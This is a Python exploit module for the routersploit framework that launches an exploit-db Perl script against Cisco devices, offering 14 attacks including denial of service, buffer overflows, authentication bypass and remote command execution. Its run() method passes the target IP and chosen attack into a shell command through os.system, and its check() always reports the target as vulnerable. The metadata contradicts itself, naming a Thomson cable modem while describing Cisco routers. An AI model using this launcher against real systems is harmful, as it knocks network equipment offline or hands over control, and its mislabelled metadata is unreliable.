import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "Thomson_Cablemodem_TCM315-Denial-of_Service",

        "description": " A problem has been identified in the handling of specific types of traffic by "
                       " Cisco 6000, 6500, and 7600 routers with the MSFC2 device. Because of this, "
                       " an attacker could potentially crash a vulnerable system. ",

        "authors": (

            "blackangels",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/23638",

        ),

        "devices": (

            "Cisco, CVE-2004-0244"
        ),
    }

    target = OptIP(""," target ip")
    expvuln = OptString(""," vulnerability number(1-14)")


    def numbers(self):
        print("Vulnerabilities list :\n")
        print("[1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability\n")
        print("[2] - Cisco IOS Router Denial of Service Vulnerability\n")
        print("[3] - Cisco IOS HTTP Auth Vulnerability\n")
        print("[4] - Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability\n")
        print("[5] - Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability\n")
        print("[6] - Cisco 675 Web Administration Denial of Service Vulnerability\n")
        print("[7] - Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability\n")
        print("[8] - Cisco IOS Software HTTP Request Denial of Service Vulnerability\n")
        print("[9] - Cisco 514 UDP Flood Denial of Service Vulnerability\n")
        print("[10] - CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability\n")
        print("[11] - Cisco Catalyst Memory Leak Vulnerability\n")
        print("[12] - Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability\n")
        print("[13] - Encoding IDS Bypass Vulnerability (UTF)\n")
        print("[14] - Cisco IOS HTTP Denial of Service Vulnerability\n")
        
    
    def run(self):

        if self.check():
            if 1 <= int(self.expvuln) <= 14:

                print_success("Target seems to be vulnerable")
                text = os.path.basename(__file__)
                print(text)
                path = os.path.realpath(__file__)
                path = path.replace(text,'')
                path = path.replace('\\','/')
                path1 = 'cd {}'.format(path)
                fileName = "perl exploit-db-23638.pl {} {}".format(self.target,self.expvuln)
                path2 = path1 + " && " + fileName
                #print(path2)
                os.system(path2)
            else:
                self.numbers()
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
